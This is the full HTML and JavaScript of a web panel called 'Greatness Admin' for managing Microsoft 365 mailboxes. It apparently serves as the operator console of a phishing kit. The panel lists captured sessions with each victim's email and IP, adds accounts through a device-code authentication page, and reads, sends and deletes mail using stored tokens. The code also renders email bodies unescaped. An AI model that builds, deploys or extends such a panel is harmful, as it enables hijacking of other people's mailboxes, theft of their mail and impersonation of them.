<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Greatness Admin - Full Mailbox Management</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1e1e2e;
            color: #e0e0e0;
            overflow: hidden;
        }

        /* Main Layout */
        .app-container {
            display: flex;
            height: 100vh;
        }

        /* Sidebar - Sessions List */
        .sidebar {
            width: 300px;
            background: #111827;
            border-right: 1px solid #2d3748;
            display: flex;
            flex-direction: column;
            overflow-y: auto;
        }

        .sidebar-header {
            padding: 20px;
            border-bottom: 1px solid #2d3748;
            background: #0f172a;
        }

        .sidebar-header h1 {
            font-size: 20px;
            background: linear-gradient(135deg, #667eea, #3b82f6);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .sidebar-header p {
            font-size: 11px;
            color: #6b7280;
            margin-top: 4px;
        }

        .sessions-list {
            flex: 1;
            padding: 16px;
        }

        .session-card {
            background: #1a1f3e;
            border: 1px solid #2d3748;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 12px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .session-card:hover {
            background: #1f2937;
            border-color: #3b82f6;
            transform: translateX(4px);
        }

        .session-card.active {
            border-color: #3b82f6;
            background: #1e293b;
            box-shadow: 0 0 10px rgba(59,130,246,0.3);
        }

        .session-email {
            font-size: 13px;
            font-weight: 600;
            word-break: break-all;
            color: white;
        }

        .session-ip {
            font-size: 10px;
            color: #6b7280;
            margin-top: 4px;
        }

        .session-time {
            font-size: 9px;
            color: #4b5563;
            margin-top: 6px;
        }

        .btn-add {
            background: linear-gradient(135deg, #667eea, #3b82f6);
            border: none;
            padding: 12px;
            border-radius: 10px;
            color: white;
            cursor: pointer;
            width: calc(100% - 32px);
            margin: 0 16px 16px;
            font-weight: 600;
        }

        .btn-add:hover {
            transform: translateY(-1px);
        }

        /* Main Content Area */
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        /* Top Bar */
        .top-bar {
            background: #111827;
            padding: 12px 20px;
            border-bottom: 1px solid #2d3748;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .current-session-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .current-email {
            font-size: 14px;
            font-weight: 600;
            color: #60a5fa;
        }

        .btn-icon {
            background: #1f2937;
            border: 1px solid #374151;
            padding: 6px 12px;
            border-radius: 6px;
            color: white;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.2s;
        }

        .btn-icon:hover {
            background: #374151;
        }

        /* Folders Bar */
        .folders-bar {
            background: #0f172a;
            padding: 8px 20px;
            border-bottom: 1px solid #2d3748;
            display: flex;
            gap: 8px;
            overflow-x: auto;
        }

        .folder-btn {
            background: transparent;
            border: none;
            padding: 8px 16px;
            border-radius: 20px;
            color: #9ca3af;
            cursor: pointer;
            font-size: 13px;
            transition: all 0.2s;
            white-space: nowrap;
        }

        .folder-btn:hover {
            background: #1f2937;
            color: white;
        }

        .folder-btn.active {
            background: #3b82f6;
            color: white;
        }

        /* Email List */
        .email-list {
            flex: 1;
            overflow-y: auto;
            padding: 16px;
        }

        .email-item {
            background: #111827;
            border: 1px solid #2d3748;
            border-radius: 10px;
            padding: 14px;
            margin-bottom: 8px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .email-item:hover {
            background: #1a1f3e;
            border-color: #3b82f6;
        }

        .email-item.unread {
            background: #1e293b;
            border-left: 3px solid #3b82f6;
        }

        .email-subject {
            font-weight: 600;
            margin-bottom: 4px;
            font-size: 14px;
        }

        .email-from {
            font-size: 12px;
            color: #9ca3af;
            margin-bottom: 4px;
        }

        .email-preview {
            font-size: 11px;
            color: #6b7280;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .email-meta {
            display: flex;
            justify-content: space-between;
            margin-top: 8px;
            font-size: 10px;
            color: #4b5563;
        }

        .attachment-icon {
            color: #f59e0b;
            margin-left: 8px;
        }

        /* Email View Panel */
        .email-panel {
            position: fixed;
            right: -600px;
            top: 0;
            width: 600px;
            height: 100vh;
            background: #111827;
            border-left: 1px solid #2d3748;
            z-index: 1000;
            transition: right 0.3s ease;
            display: flex;
            flex-direction: column;
            overflow-y: auto;
        }

        .email-panel.open {
            right: 0;
        }

        .panel-header {
            padding: 20px;
            border-bottom: 1px solid #2d3748;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            background: #111827;
        }

        .panel-body {
            padding: 20px;
            flex: 1;
        }

        .email-full-subject {
            font-size: 18px;
            margin-bottom: 15px;
        }

        .email-details {
            background: #0f172a;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 12px;
        }

        .email-content {
            line-height: 1.6;
            font-size: 14px;
        }

        .action-buttons {
            display: flex;
            gap: 8px;
            margin-top: 20px;
            flex-wrap: wrap;
        }

        /* Compose Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.8);
            z-index: 2000;
            justify-content: center;
            align-items: center;
        }

        .modal.open {
            display: flex;
        }

        .modal-content {
            background: #111827;
            border-radius: 16px;
            width: 550px;
            max-width: 90%;
            max-height: 85vh;
            overflow-y: auto;
            border: 1px solid #374151;
        }

        .modal-header {
            padding: 20px;
            border-bottom: 1px solid #2d3748;
            display: flex;
            justify-content: space-between;
        }

        .modal-body {
            padding: 20px;
        }

        .modal-body input, .modal-body textarea {
            width: 100%;
            background: #1f2937;
            border: 1px solid #374151;
            padding: 10px;
            border-radius: 8px;
            color: white;
            margin-bottom: 12px;
            font-family: inherit;
        }

        .modal-body textarea {
            resize: vertical;
            min-height: 150px;
        }

        .loading {
            text-align: center;
            padding: 40px;
            color: #6b7280;
        }

        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #374151;
            border-top-color: #3b82f6;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .empty-state {
            text-align: center;
            padding: 60px;
            color: #6b7280;
        }

        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: #1f2937;
        }

        ::-webkit-scrollbar-thumb {
            background: #374151;
            border-radius: 4px;
        }
    </style>
</head>
<body>
<div class="app-container">
    <!-- Sidebar with Sessions -->
    <div class="sidebar">
        <div class="sidebar-header">
            <h1>Greatness Admin</h1>
            <p>Microsoft 365 Mailbox Manager</p>
        </div>
        
        <div class="sessions-list" id="sessionsList">
            <div class="loading">Loading sessions...</div>
        </div>
        
        <button class="btn-add" onclick="openAuthPage()">➕ Add Microsoft Account</button>
        <button class="btn-add" style="background: #dc2626; margin-bottom: 20px;" onclick="clearAllSessions()">🗑️ Clear All Sessions</button>
    </div>
    
    <!-- Main Content -->
    <div class="main-content">
        <div class="top-bar">
            <div class="current-session-info">
                <span>📧</span>
                <span class="current-email" id="currentEmailDisplay">No session selected</span>
            </div>
            <div>
                <button class="btn-icon" onclick="refreshCurrentFolder()">🔄 Refresh</button>
            </div>
        </div>
        
        <!-- Folders -->
        <div class="folders-bar" id="foldersBar">
            <button class="folder-btn active" onclick="loadFolder('inbox')">📥 Inbox</button>
            <button class="folder-btn" onclick="loadFolder('sent')">📤 Sent</button>
            <button class="folder-btn" onclick="loadFolder('drafts')">📝 Drafts</button>
            <button class="folder-btn" onclick="loadFolder('deleted')">🗑️ Deleted</button>
            <button class="folder-btn" onclick="loadFolder('archive')">📦 Archive</button>
            <button class="folder-btn" onclick="loadFolder('junk')">⚠️ Junk</button>
        </div>
        
        <!-- Email List -->
        <div class="email-list" id="emailList">
            <div class="empty-state">Select a session to view emails</div>
        </div>
    </div>
</div>

<!-- Email View Panel -->
<div id="emailPanel" class="email-panel">
    <div class="panel-header">
        <h3 id="panelSubject">Loading...</h3>
        <button class="btn-icon" onclick="closeEmailPanel()">✕ Close</button>
    </div>
    <div class="panel-body" id="panelBody">
        <div class="loading"><div class="spinner"></div> Loading...</div>
    </div>
</div>

<!-- Compose Modal -->
<div id="composeModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>✏️ New Email</h3>
            <button class="btn-icon" onclick="closeComposeModal()">✕</button>
        </div>
        <div class="modal-body">
            <input type="text" id="composeTo" placeholder="To: email@example.com">
            <input type="text" id="composeCc" placeholder="Cc: (optional)">
            <input type="text" id="composeSubject" placeholder="Subject">
            <textarea id="composeBody" placeholder="Write your message here..."></textarea>
            <div style="display: flex; gap: 10px; margin-top: 10px;">
                <button class="btn-icon" style="background: #3b82f6;" onclick="sendEmail()">Send</button>
                <button class="btn-icon" onclick="closeComposeModal()">Cancel</button>
            </div>
        </div>
    </div>
</div>

<script>
    const API_BASE_URL = '';
    let currentSessionId = null;
    let currentFolder = 'inbox';
    let currentEmails = [];
    let sessions = [];
    let currentMessageId = null;
    
    // Load all sessions
    async function loadSessions() {
        try {
            const response = await fetch('/api/sessions');
            const data = await response.json();
            sessions = data.sessions || [];
            renderSessionsList();
            
            if (sessions.length === 0) {
                document.getElementById('emailList').innerHTML = '<div class="empty-state">📭 No accounts connected. Click "Add Microsoft Account" to start.</div>';
            }
        } catch (err) {
            console.error('Failed to load sessions:', err);
        }
    }
    
    // Render sessions list
    function renderSessionsList() {
        const container = document.getElementById('sessionsList');
        if (sessions.length === 0) {
            container.innerHTML = '<div class="empty-state" style="padding: 20px;">No accounts yet<br><small>Click below to add</small></div>';
            return;
        }
        
        container.innerHTML = sessions.map(session => `
            <div class="session-card ${currentSessionId === session.sessionId ? 'active' : ''}" onclick="selectSession('${session.sessionId}')">
                <div class="session-email">📧 ${escapeHtml(session.email)}</div>
                <div class="session-ip">🌐 IP: ${escapeHtml(session.ip || 'Unknown')}</div>
                <div class="session-time">🕐 Last active: ${formatDate(session.lastActive)}</div>
                <div style="margin-top: 8px;">
                    <button class="btn-icon" style="font-size: 10px; padding: 4px 8px;" onclick="event.stopPropagation(); openMailbox('${session.sessionId}')">📧 Open Mailbox</button>
                </div>
            </div>
        `).join('');
    }
    
    // Select session and load mailbox
    async function selectSession(sessionId) {
        currentSessionId = sessionId;
        const session = sessions.find(s => s.sessionId === sessionId);
        if (session) {
            document.getElementById('currentEmailDisplay').innerHTML = session.email;
            renderSessionsList();
            await loadFolder('inbox');
        }
    }
    
    // Open mailbox directly (called from Open Email button)
    async function openMailbox(sessionId) {
        await selectSession(sessionId);
    }
    
    // Load folder emails
    async function loadFolder(folder) {
        if (!currentSessionId) {
            document.getElementById('emailList').innerHTML = '<div class="empty-state">Select a session first</div>';
            return;
        }
        
        currentFolder = folder;
        
        // Update active folder button
        document.querySelectorAll('.folder-btn').forEach(btn => {
            btn.classList.remove('active');
            if (btn.textContent.toLowerCase().includes(folder)) {
                btn.classList.add('active');
            }
        });
        
        document.getElementById('emailList').innerHTML = '<div class="loading"><div class="spinner"></div> Loading emails...</div>';
        
        try {
            const response = await fetch(`/api/mail/${currentSessionId}/${folder}?top=50`);
            const data = await response.json();
            currentEmails = data.value || [];
            renderEmailList(currentEmails);
        } catch (err) {
            console.error('Failed to load emails:', err);
            document.getElementById('emailList').innerHTML = '<div class="empty-state">Failed to load emails. Token may have expired.</div>';
        }
    }
    
    // Render email list
    function renderEmailList(emails) {
        if (!emails || emails.length === 0) {
            document.getElementById('emailList').innerHTML = '<div class="empty-state">📭 No emails in this folder</div>';
            return;
        }
        
        document.getElementById('emailList').innerHTML = emails.map(email => `
            <div class="email-item ${!email.isRead ? 'unread' : ''}" onclick="openEmail('${email.id}')">
                <div class="email-subject">
                    ${escapeHtml(email.subject || '(No subject)')}
                    ${email.hasAttachments ? '<span class="attachment-icon">📎</span>' : ''}
                </div>
                <div class="email-from">${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address || 'Unknown')}</div>
                <div class="email-preview">${escapeHtml(email.bodyPreview || 'No preview')}</div>
                <div class="email-meta">
                    <span>📅 ${formatDate(email.receivedDateTime)}</span>
                    ${!email.isRead ? '<span>🔵 Unread</span>' : ''}
                </div>
            </div>
        `).join('');
    }
    
    // Open full email
    async function openEmail(messageId) {
        currentMessageId = messageId;
        document.getElementById('emailPanel').classList.add('open');
        document.getElementById('panelSubject').innerHTML = 'Loading...';
        document.getElementById('panelBody').innerHTML = '<div class="loading"><div class="spinner"></div> Loading message...</div>';
        
        try {
            const response = await fetch(`/api/mail/message/${currentSessionId}/${messageId}`);
            const email = await response.json();
            
            document.getElementById('panelSubject').innerHTML = escapeHtml(email.subject || '(No subject)');
            document.getElementById('panelBody').innerHTML = `
                <div class="email-details">
                    <div><strong>From:</strong> ${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address)}</div>
                    <div><strong>To:</strong> ${escapeHtml(email.toRecipients?.map(r => r.emailAddress.address).join(', ') || 'Unknown')}</div>
                    <div><strong>Date:</strong> ${new Date(email.receivedDateTime).toLocaleString()}</div>
                </div>
                <div class="email-content">
                    ${email.body?.content || email.bodyPreview || 'No content'}
                </div>
                <div class="action-buttons">
                    <button class="btn-icon" onclick="replyToEmail()">↩️ Reply</button>
                    <button class="btn-icon" onclick="deleteEmail()">🗑️ Delete</button>
                    <button class="btn-icon" onclick="markAsRead()">✓ Mark as Read</button>
                    <button class="btn-icon" onclick="closeEmailPanel()">Close</button>
                </div>
            `;
            
            // Mark as read if not already
            if (!email.isRead) {
                await fetch(`/api/mail/message/${currentSessionId}/${messageId}`, {
                    method: 'PATCH',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ isRead: true })
                });
                loadFolder(currentFolder);
            }
        } catch (err) {
            document.getElementById('panelBody').innerHTML = '<div class="empty-state">Failed to load message</div>';
        }
    }
    
    // Send email
    async function sendEmail() {
        const to = document.getElementById('composeTo').value.split(',').map(e => e.trim());
        const cc = document.getElementById('composeCc').value.split(',').map(e => e.trim()).filter(e => e);
        const subject = document.getElementById('composeSubject').value;
        const body = document.getElementById('composeBody').value;
        
        if (!to.length || !subject) {
            alert('Please fill in To and Subject');
            return;
        }
        
        try {
            const response = await fetch(`/api/mail/send/${currentSessionId}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ to, cc, subject, body })
            });
            
            const result = await response.json();
            if (result.success) {
                alert('Email sent successfully!');
                closeComposeModal();
                loadFolder(currentFolder);
            } else {
                alert('Failed to send email');
            }
        } catch (err) {
            alert('Error sending email');
        }
    }
    
    // Delete current email
    async function deleteEmail() {
        if (!confirm('Delete this email?')) return;
        
        try {
            await fetch(`/api/mail/message/${currentSessionId}/${currentMessageId}`, {
                method: 'DELETE'
            });
            closeEmailPanel();
            loadFolder(currentFolder);
        } catch (err) {
            alert('Failed to delete');
        }
    }
    
    // Mark as read
    async function markAsRead() {
        try {
            await fetch(`/api/mail/message/${currentSessionId}/${currentMessageId}`, {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ isRead: true })
            });
            loadFolder(currentFolder);
        } catch (err) {
            alert('Failed to mark as read');
        }
    }
    
    // Reply to email
    function replyToEmail() {
        const email = currentEmails.find(e => e.id === currentMessageId);
        if (email) {
            document.getElementById('composeTo').value = email.from?.emailAddress?.address || '';
            document.getElementById('composeSubject').value = `Re: ${email.subject || ''}`;
            document.getElementById('composeBody').value = `\n\n\n----- Original Message -----\nFrom: ${email.from?.emailAddress?.name}\nSent: ${formatDate(email.receivedDateTime)}\nSubject: ${email.subject}\n\n${email.bodyPreview}`;
            openComposeModal();
        }
    }
    
    function refreshCurrentFolder() {
        loadFolder(currentFolder);
    }
    
    function openComposeModal() {
        if (!currentSessionId) {
            alert('Please select a session first');
            return;
        }
        document.getElementById('composeModal').classList.add('open');
    }
    
    function closeComposeModal() {
        document.getElementById('composeModal').classList.remove('open');
        document.getElementById('composeTo').value = '';
        document.getElementById('composeCc').value = '';
        document.getElementById('composeSubject').value = '';
        document.getElementById('composeBody').value = '';
    }
    
    function closeEmailPanel() {
        document.getElementById('emailPanel').classList.remove('open');
        currentMessageId = null;
    }
    
    function openAuthPage() {
        window.open('/device-auth.html', '_blank', 'width=600,height=700');
        // Refresh sessions after 5 seconds
        setTimeout(loadSessions, 5000);
    }
    
    async function clearAllSessions() {
        if (confirm('⚠️ WARNING: This will delete ALL sessions and tokens. Continue?')) {
            await fetch('/api/sessions/clear', { method: 'DELETE' });
            currentSessionId = null;
            await loadSessions();
            document.getElementById('emailList').innerHTML = '<div class="empty-state">All sessions cleared. Add a new account to start.</div>';
            document.getElementById('currentEmailDisplay').innerHTML = 'No session selected';
        }
    }
    
    function escapeHtml(str) {
        if (!str) return '';
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }
    
    function formatDate(dateStr) {
        if (!dateStr) return 'Unknown';
        const date = new Date(dateStr);
        const now = new Date();
        if (date.toDateString() === now.toDateString()) {
            return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        }
        return date.toLocaleDateString();
    }
    
    // Auto-refresh sessions every 15 seconds
    setInterval(loadSessions, 15000);
    
    // Initial load
    loadSessions();
</script>
</body>
</html>
